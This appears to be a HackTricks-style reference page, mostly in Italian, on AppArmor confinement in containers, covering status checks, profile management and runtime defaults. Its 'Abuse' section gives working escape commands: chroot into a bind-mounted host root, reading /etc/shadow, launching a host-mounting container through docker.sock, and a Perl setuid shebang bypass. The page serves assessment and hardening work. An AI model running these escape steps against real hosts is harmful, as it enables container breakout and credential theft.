# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

AppArmor è un sistema di **Mandatory Access Control** che applica restrizioni tramite profili per programma. A differenza dei tradizionali controlli DAC, che dipendono fortemente dalla proprietà di utente e gruppo, AppArmor permette al kernel di far rispettare una policy legata al processo stesso. Negli ambienti container, questo è importante perché un workload può avere sufficienti privilegi tradizionali per tentare un'azione e comunque essere rifiutato perché il suo profilo AppArmor non permette il percorso, il mount, il comportamento di rete o l'uso di una capability rilevante.

Il punto concettuale più importante è che AppArmor è **basato sui percorsi**. Valuta l'accesso al filesystem tramite regole sul percorso piuttosto che tramite label come fa SELinux. Questo lo rende accessibile e potente, ma significa anche che bind mounts e layout alternativi dei percorsi richiedono attenzione. Se lo stesso contenuto dell'host diventa raggiungibile tramite un percorso diverso, l'effetto della policy potrebbe non essere quello che l'operatore si aspettava inizialmente.

## Ruolo nell'isolamento dei container

Le revisioni di sicurezza dei container spesso si fermano a capabilities e seccomp, ma AppArmor continua a essere rilevante dopo quei controlli. Immagina un container che ha più privilegi del dovuto, o un workload che ha bisogno di una capability in più per motivi operativi. AppArmor può ancora limitare l'accesso ai file, il comportamento dei mount, il networking e i modelli di esecuzione in modi che bloccano il percorso di abuso più ovvio. Per questo motivo disabilitare AppArmor "solo per far funzionare l'applicazione" può trasformare silenziosamente una configurazione semplicemente rischiosa in una che è attivamente sfruttabile.

## Laboratorio

Per verificare se AppArmor è attivo sull'host, usa:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Per vedere sotto quale utente è in esecuzione il processo corrente del container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La differenza è istruttiva. Nel caso normale, il processo dovrebbe mostrare un contesto AppArmor legato al profilo scelto dal runtime. Nel caso unconfined, quello strato aggiuntivo di restrizione scompare.

Puoi anche ispezionare cosa Docker pensa di aver applicato:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilizzo a runtime

Docker può applicare un profilo AppArmor predefinito o personalizzato quando l'host lo supporta. Podman può anche integrarsi con AppArmor sui sistemi basati su AppArmor, anche se sulle distribuzioni che privilegiano SELinux è spesso quest'ultimo MAC a prendere il ruolo centrale. Kubernetes può esporre la policy AppArmor a livello di workload sui nodi che effettivamente supportano AppArmor. LXC e gli ambienti container di sistema della famiglia Ubuntu usano anch'essi AppArmor estensivamente.

Il punto pratico è che AppArmor non è una "Docker feature". È una caratteristica del kernel dell'host che diversi runtime possono scegliere di applicare. Se l'host non lo supporta o al runtime è stato detto di girare unconfined, la presunta protezione in realtà non c'è.

Su host AppArmor con supporto Docker, il predefinito più noto è `docker-default`. Quel profilo è generato dal template AppArmor di Moby ed è importante perché spiega perché alcuni PoC basati su capability falliscono ancora in un container di default. In termini generali, `docker-default` permette il networking ordinario, nega le scritture a gran parte di `/proc`, nega l'accesso a parti sensibili di `/sys`, blocca le operazioni di mount e restringe ptrace in modo che non sia una primitiva generale per sondare l'host. Capire quella baseline aiuta a distinguere "il container ha `CAP_SYS_ADMIN`" da "il container può effettivamente usare quella capability contro le interfacce del kernel che mi interessano".

## Gestione dei profili

I profili AppArmor sono di solito memorizzati sotto `/etc/apparmor.d/`. Una convenzione di denominazione comune è sostituire le slash nel path dell'eseguibile con dei punti. Per esempio, un profilo per `/usr/bin/man` è comunemente memorizzato come `/etc/apparmor.d/usr.bin.man`. Questo dettaglio è importante sia in difesa che in assessment perché una volta che conosci il nome del profilo attivo, spesso puoi individuare rapidamente il file corrispondente sull'host.

Comandi utili per la gestione sul lato host includono:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
The reason these commands matter in a container-security reference is that they explain how profiles are actually built, loaded, switched to complain mode, and modified after application changes. If an operator has a habit of moving profiles into complain mode during troubleshooting and forgetting to restore enforcement, the container may look protected in documentation while behaving much more loosely in reality.

### Creazione e aggiornamento dei profili

`aa-genprof` can observe application behavior and help generate a profile interactively:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` può generare un profilo modello che può poi essere caricato con `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando il binario cambia e la policy deve essere aggiornata, `aa-logprof` può riprodurre i denials trovati nei log e aiutare l'operatore a decidere se permetterli o negarli:
```bash
sudo aa-logprof
```
### Registri

I dinieghi di AppArmor sono spesso visibili tramite `auditd`, syslog o strumenti come `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Questo è utile a livello operativo e offensivo. I difensori lo usano per perfezionare i profili. Gli attaccanti lo usano per capire quale path o operazione esatta viene negata e se AppArmor è il controllo che blocca una catena di exploit.

### Identificare il file del profilo esatto

Quando un runtime mostra un nome di profilo AppArmor specifico per un container, spesso è utile ricondurre quel nome al file del profilo sul disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Questo è particolarmente utile durante la revisione lato host perché colma il divario tra "il container dice di essere eseguito con il profilo `lowpriv`" e "le regole effettive risiedono in questo specifico file che può essere verificato o ricaricato".

## Misconfigurations

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## Abuse

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se il container dispone anche di una capability pericolosa come `CAP_SYS_ADMIN`, uno dei test più pratici è verificare se AppArmor è il controllo che sta bloccando le operazioni di mount o l'accesso a filesystem kernel sensibili:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In ambienti in cui un host path è già disponibile tramite un bind mount, la perdita di AppArmor può anche trasformare un problema di divulgazione di informazioni in sola lettura in un accesso diretto ai file dell'host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Lo scopo di questi comandi non è che AppArmor da solo provochi il breakout. Piuttosto, una volta rimosso AppArmor, molte vie di abuso basate su filesystem e mount diventano immediatamente testabili.

### Esempio completo: AppArmor disabilitato + root dell'host montata

Se il container ha già la root dell'host bind-mounted in `/host`, rimuovere AppArmor può trasformare una via di abuso basata su filesystem bloccata in un completo host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Una volta che la shell viene eseguita attraverso il filesystem dell'host, il workload è effettivamente fuoriuscito dal perimetro del container:
```bash
id
hostname
cat /etc/shadow | head
```
### Esempio completo: AppArmor disabilitato + Runtime Socket

Se la vera barriera era AppArmor intorno allo stato runtime, un socket montato può essere sufficiente per una fuga completa:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Il percorso esatto dipende dal punto di montaggio, ma il risultato finale è lo stesso: AppArmor non impedisce più l'accesso alla runtime API, e la runtime API può avviare un container che compromette l'host.

### Esempio completo: Path-Based Bind-Mount Bypass

Poiché AppArmor è basato sui percorsi, proteggere `/proc/**` non protegge automaticamente lo stesso contenuto procfs dell'host quando è raggiungibile tramite un percorso diverso:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
### Esempio completo: Shebang Bypass

L'impatto dipende da cosa è effettivamente montato e se il percorso alternativo bypassa anche altri controlli, ma questo schema è uno dei motivi più chiari per cui AppArmor deve essere valutato insieme al layout dei mount anziché in isolamento.

La policy di AppArmor a volte punta a un percorso di interprete in modo che non tenga pienamente conto dell'esecuzione di script tramite la gestione dello shebang. Un esempio storico prevedeva l'uso di uno script la cui prima riga punta a un interprete confinato:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Questo tipo di esempio è importante come promemoria che l'intento del profilo e la semantica di esecuzione effettiva possono divergere. Quando si esamina AppArmor in ambienti container, catene di interpreti e percorsi di esecuzione alternativi meritano particolare attenzione.

## Controlli

L'obiettivo di questi controlli è rispondere rapidamente a tre domande: AppArmor è abilitato sull'host, il processo corrente è confinato e il runtime ha effettivamente applicato un profilo a questo container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Cosa è interessante qui:

- Se `/proc/self/attr/current` mostra `unconfined`, il workload non beneficia della confinamento AppArmor.
- Se `aa-status` indica AppArmor disabilitato o non caricato, qualsiasi nome di profilo nella configurazione di runtime è per lo più puramente cosmetico.
- Se `docker inspect` mostra `unconfined` o un profilo custom inatteso, spesso è il motivo per cui un percorso di abuso basato su filesystem o mount funziona.

Se un container ha già privilegi elevati per motivi operativi, lasciare AppArmor abilitato spesso fa la differenza tra un'eccezione controllata e una compromissione di sicurezza molto più ampia.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Per AppArmor, la variabile più importante è spesso il **host**, non solo il runtime. Un'impostazione di profilo in un manifest non crea confinamento su un nodo dove AppArmor non è abilitato.
{{#include ../../../../banners/hacktricks-training.md}}
